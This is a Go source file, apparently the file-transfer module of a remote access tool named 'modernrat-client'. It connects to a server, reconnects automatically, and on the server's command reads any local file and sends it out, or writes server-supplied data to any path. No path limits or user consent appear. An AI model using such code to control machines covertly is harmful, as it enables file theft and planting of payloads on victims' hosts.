package main

import (
	"context"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"sync"
	"time"

	pb "modernrat-client/gen"
)

type fileTransferState struct {
	stream pb.FileTransferService_ClientFileTransferClient
	userID string

	sendMu sync.Mutex

	mu       sync.Mutex
	sessions map[string]*clientFileTransfer
}

type clientFileTransfer struct {
	id         string
	remotePath string
	mode       transferMode
	file       *os.File
}

type transferMode int

const (
	transferModeUpload transferMode = iota
	transferModeDownload
)

func newFileTransferState(stream pb.FileTransferService_ClientFileTransferClient, userID string) *fileTransferState {
	return &fileTransferState{
		stream:   stream,
		userID:   userID,
		sessions: make(map[string]*clientFileTransfer),
	}
}

func (s *fileTransferState) send(msg *pb.FileTransferMessage) error {
	if msg == nil {
		return nil
	}
	if msg.UserId == "" {
		msg.UserId = s.userID
	}

	s.sendMu.Lock()
	defer s.sendMu.Unlock()
	return s.stream.Send(msg)
}

func (s *fileTransferState) start(ctx context.Context) error {
	register := &pb.FileTransferMessage{
		Type:   pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_REGISTER,
		UserId: s.userID,
	}
	if err := s.send(register); err != nil {
		return fmt.Errorf("failed to register file transfer channel: %w", err)
	}

	for {
		msg, err := s.stream.Recv()
		if err != nil {
			if errors.Is(err, context.Canceled) || errors.Is(err, io.EOF) {
				return err
			}
			return fmt.Errorf("file transfer stream recv: %w", err)
		}

		if err := s.handleMessage(ctx, msg); err != nil {
			if errors.Is(err, context.Canceled) {
				return err
			}
			log.Printf("file transfer message handling failed: %v", err)
		}
	}
}

func (s *fileTransferState) handleMessage(ctx context.Context, msg *pb.FileTransferMessage) error {
	switch msg.GetType() {
	case pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_REGISTERED:
		log.Printf("ファイル転送チャネルが準備できました")
		return nil

	case pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_UPLOAD_REQUEST:
		return s.handleUploadRequest(msg)

	case pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_DOWNLOAD_REQUEST:
		return s.handleDownloadRequest(ctx, msg)

	case pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_DATA:
		return s.handleData(msg)

	case pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_COMPLETE:
		return s.handleComplete(msg)

	case pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_CANCEL:
		return s.handleCancel(msg)

	case pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_REJECTED:
		return s.handleRejected(msg)

	case pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_ERROR:
		return s.handleError(msg)

	default:
		return fmt.Errorf("unsupported file transfer message type: %v", msg.GetType())
	}
}

func (s *fileTransferState) handleUploadRequest(msg *pb.FileTransferMessage) error {
	remotePath := msg.GetRemotePath()
	dir := filepath.Dir(remotePath)
	if dir != "." && dir != "" {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			log.Printf("failed to create directory for upload (%s): %v", dir, err)
			return s.send(&pb.FileTransferMessage{
				TransferId: msg.GetTransferId(),
				Type:       pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_REJECTED,
				Text:       fmt.Sprintf("failed to create directory: %v", err),
			})
		}
	}

	file, err := os.OpenFile(remotePath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o644)
	if err != nil {
		log.Printf("failed to open destination file (%s): %v", remotePath, err)
		return s.send(&pb.FileTransferMessage{
			TransferId: msg.GetTransferId(),
			Type:       pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_REJECTED,
			Text:       fmt.Sprintf("failed to open file: %v", err),
		})
	}

	transfer := &clientFileTransfer{
		id:         msg.GetTransferId(),
		remotePath: remotePath,
		mode:       transferModeUpload,
		file:       file,
	}

	s.mu.Lock()
	s.sessions[msg.GetTransferId()] = transfer
	s.mu.Unlock()

	ack := &pb.FileTransferMessage{
		TransferId: msg.GetTransferId(),
		Type:       pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_ACCEPTED,
		RemotePath: remotePath,
		FileSize:   msg.GetFileSize(),
	}
	return s.send(ack)
}

func (s *fileTransferState) handleDownloadRequest(ctx context.Context, msg *pb.FileTransferMessage) error {
	remotePath := msg.GetRemotePath()
	file, err := os.Open(remotePath)
	if err != nil {
		log.Printf("failed to open source file (%s): %v", remotePath, err)
		return s.send(&pb.FileTransferMessage{
			TransferId: msg.GetTransferId(),
			Type:       pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_ERROR,
			Text:       fmt.Sprintf("failed to open file: %v", err),
		})
	}

	info, err := file.Stat()
	if err != nil {
		_ = file.Close()
		return s.send(&pb.FileTransferMessage{
			TransferId: msg.GetTransferId(),
			Type:       pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_ERROR,
			Text:       fmt.Sprintf("failed to stat file: %v", err),
		})
	}

	transfer := &clientFileTransfer{
		id:         msg.GetTransferId(),
		remotePath: remotePath,
		mode:       transferModeDownload,
		file:       file,
	}

	s.mu.Lock()
	s.sessions[msg.GetTransferId()] = transfer
	s.mu.Unlock()

	ack := &pb.FileTransferMessage{
		TransferId: msg.GetTransferId(),
		Type:       pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_ACCEPTED,
		RemotePath: remotePath,
		FileSize:   info.Size(),
	}
	if err := s.send(ack); err != nil {
		cleanupTransfer(s.removeSession(msg.GetTransferId()), false)
		return err
	}

	const chunkSize = 64 * 1024
	buf := make([]byte, chunkSize)
	var offset int64
	for {
		select {
		case <-ctx.Done():
			cleanupTransfer(s.removeSession(msg.GetTransferId()), false)
			return ctx.Err()
		default:
		}

		n, err := transfer.file.Read(buf)
		if n > 0 {
			chunk := &pb.FileTransferMessage{
				TransferId: msg.GetTransferId(),
				Type:       pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_DATA,
				RemotePath: remotePath,
				Offset:     offset,
				Data:       append([]byte(nil), buf[:n]...),
			}
			if err := s.send(chunk); err != nil {
				cleanupTransfer(s.removeSession(msg.GetTransferId()), false)
				return err
			}
			offset += int64(n)
		}

		if errors.Is(err, io.EOF) {
			break
		}
		if err != nil {
			cleanupTransfer(s.removeSession(msg.GetTransferId()), false)
			return err
		}
	}

	complete := &pb.FileTransferMessage{
		TransferId: msg.GetTransferId(),
		Type:       pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_COMPLETE,
		RemotePath: remotePath,
	}
	if err := s.send(complete); err != nil {
		cleanupTransfer(s.removeSession(msg.GetTransferId()), false)
		return err
	}

	cleanupTransfer(s.removeSession(msg.GetTransferId()), false)
	return nil
}

func (s *fileTransferState) handleData(msg *pb.FileTransferMessage) error {
	s.mu.Lock()
	transfer, ok := s.sessions[msg.GetTransferId()]
	s.mu.Unlock()

	if !ok {
		return errors.New("unknown transfer for data message")
	}

	if transfer.mode != transferModeUpload {
		return errors.New("unexpected DATA for download session")
	}

	if _, err := transfer.file.Write(msg.GetData()); err != nil {
		cleanupTransfer(s.removeSession(msg.GetTransferId()), true)
		return s.send(&pb.FileTransferMessage{
			TransferId: msg.GetTransferId(),
			Type:       pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_ERROR,
			Text:       fmt.Sprintf("failed to write file: %v", err),
		})
	}
	return nil
}

func (s *fileTransferState) handleComplete(msg *pb.FileTransferMessage) error {
	transfer := s.removeSession(msg.GetTransferId())
	if transfer == nil {
		return nil
	}

	cleanupTransfer(transfer, false)

	ack := &pb.FileTransferMessage{
		TransferId: msg.GetTransferId(),
		Type:       pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_COMPLETE,
		RemotePath: transfer.remotePath,
	}
	return s.send(ack)
}

func (s *fileTransferState) handleCancel(msg *pb.FileTransferMessage) error {
	transfer := s.removeSession(msg.GetTransferId())
	if transfer == nil {
		return nil
	}

	cleanupTransfer(transfer, transfer.mode == transferModeUpload)

	notify := &pb.FileTransferMessage{
		TransferId: msg.GetTransferId(),
		Type:       pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_CANCEL,
		RemotePath: transfer.remotePath,
		Text:       msg.GetText(),
	}
	return s.send(notify)
}

func (s *fileTransferState) handleRejected(msg *pb.FileTransferMessage) error {
	transfer := s.removeSession(msg.GetTransferId())
	cleanupTransfer(transfer, transfer != nil && transfer.mode == transferModeUpload)
	log.Printf("転送が拒否されました: transfer=%s reason=%s", msg.GetTransferId(), msg.GetText())
	return nil
}

func (s *fileTransferState) handleError(msg *pb.FileTransferMessage) error {
	transfer := s.removeSession(msg.GetTransferId())
	cleanupTransfer(transfer, transfer != nil && transfer.mode == transferModeUpload)
	log.Printf("ファイル転送エラー通知: transfer=%s message=%s", msg.GetTransferId(), msg.GetText())
	return nil
}

func (s *fileTransferState) removeSession(id string) *clientFileTransfer {
	s.mu.Lock()
	transfer := s.sessions[id]
	if transfer != nil {
		delete(s.sessions, id)
	}
	s.mu.Unlock()
	return transfer
}

func (s *fileTransferState) shutdown() {
	s.mu.Lock()
	sessions := s.sessions
	s.sessions = make(map[string]*clientFileTransfer)
	s.mu.Unlock()

	for _, session := range sessions {
		cleanupTransfer(session, session.mode == transferModeUpload)
	}
}

func cleanupTransfer(transfer *clientFileTransfer, removeFile bool) {
	if transfer == nil {
		return
	}
	if transfer.file != nil {
		_ = transfer.file.Close()
		transfer.file = nil
	}
	if removeFile && transfer.remotePath != "" {
		if err := os.Remove(transfer.remotePath); err != nil && !errors.Is(err, os.ErrNotExist) {
			log.Printf("failed to remove partial file %s: %v", transfer.remotePath, err)
		}
	}
}

func runFileTransferClient(ctx context.Context, client pb.FileTransferServiceClient, userID string) error {
	backoff := reconnectInitialBackoff

	for {
		if err := ctx.Err(); err != nil {
			return err
		}

		stream, err := client.ClientFileTransfer(ctx)
		if err != nil {
			if ctx.Err() != nil {
				return ctx.Err()
			}
			log.Printf("ファイル転送チャネル接続失敗: %v", err)
		} else {
			state := newFileTransferState(stream, userID)
			if err := state.start(ctx); err != nil && !errors.Is(err, context.Canceled) && !errors.Is(err, io.EOF) {
				log.Printf("ファイル転送チャネルが終了しました: %v", err)
			}
			state.shutdown()
		}

		if err := ctx.Err(); err != nil {
			return err
		}

		wait := backoff
		if wait > reconnectMaxBackoff {
			wait = reconnectMaxBackoff
		}
		log.Printf("%v 後にファイル転送チャネルへの再接続を試みます", wait)
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(wait):
		}

		if backoff < reconnectMaxBackoff {
			backoff *= 2
			if backoff > reconnectMaxBackoff {
				backoff = reconnectMaxBackoff
			}
		}
	}
}
